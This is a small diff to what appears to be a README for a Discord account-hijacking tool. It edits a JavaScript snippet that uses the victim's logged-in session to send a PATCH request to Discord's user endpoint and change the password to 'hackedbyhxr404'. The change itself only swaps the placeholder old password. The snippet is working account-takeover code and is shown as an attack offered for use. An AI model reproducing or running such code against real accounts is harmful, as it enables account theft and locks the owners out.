@@ -199,7 +199,7 @@ Object.values(webpackJsonp.push([
   ```js
   await fetch("https://discord.com/api/v9/users/@me", {
     "credentials": "include",
-    "body": "{\"password\":\"123\",\"new_password\":\"hackedbyhxr404\"}",
+    "body": "{\"password\":\"oldpassword\",\"new_password\":\"hackedbyhxr404\"}",
     "method": "PATCH",
 });
 ```
